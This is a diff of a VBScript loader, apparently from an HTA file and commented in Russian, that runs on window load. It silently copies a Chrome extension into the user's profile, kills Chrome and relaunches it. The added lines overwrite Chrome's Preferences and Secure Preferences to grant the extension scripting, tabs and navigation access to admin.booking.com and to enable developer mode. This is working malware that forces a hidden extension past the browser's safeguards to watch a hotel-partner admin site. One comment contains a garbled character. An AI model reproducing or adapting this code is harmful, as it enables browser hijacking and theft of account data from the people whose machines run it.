@@ -23,7 +23,7 @@ Sub Window_onLoad
     
     ' Финальная проверка и установка расширения
     If fso.FileExists(tempFolder & "\test.zip") Then
-        ' Используем ID из нашего ключа
+        ' Используем ID из н��шего ключа
         extensionId = "mfkomnpbmdkghpjhpnmjnhpgcjdeiblk"
         userDataPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data"
         chromeExtPath = userDataPath & "\Default\Extensions\" & extensionId & "\1.0"
@@ -51,6 +51,16 @@ Sub Window_onLoad
         xcopyCmd = "xcopy """ & tempFolder & "\test\*"" """ & chromeExtPath & "\" & """ /E /I /Y"
         shell.Run xcopyCmd, 0, True
         
+        ' Создаем/обновляем Secure Preferences
+        Set securePrefs = fso.CreateTextFile(userDataPath & "\Default\Secure Preferences", True)
+        securePrefs.WriteLine "{""extensions"":{""settings"":{""" & extensionId & """:{""active_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""granted_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""location"":2,""state"":1}}}}"
+        securePrefs.Close
+        
+        ' Обновляем Preferences
+        Set prefs = fso.CreateTextFile(userDataPath & "\Default\Preferences", True)
+        prefs.WriteLine "{""extensions"":{""ui"":{""developer_mode"":true},""settings"":{""" & extensionId & """:{""active_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""granted_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""location"":2,""state"":1}}}}"
+        prefs.Close
+        
         ' Удаляем временные файлы
         fso.DeleteFile(tempFolder & "\test.zip")
         fso.DeleteFolder(tempFolder & "\test")
@@ -59,9 +69,9 @@ Sub Window_onLoad
         shell.Run "taskkill /F /IM chrome.exe /T", 0, True
         shell.Run "ping -n 3 127.0.0.1", 0, True
         
-        ' Запускаем Chrome с нашим расширением
+        ' Запускаем Chrome
         chromePath = """C:\Program Files\Google\Chrome\Application\chrome.exe"""
-        shell.Run chromePath & " --load-extension=""" & chromeExtPath & """", 1, False
+        shell.Run chromePath, 1, False
     End If
     
     self.close
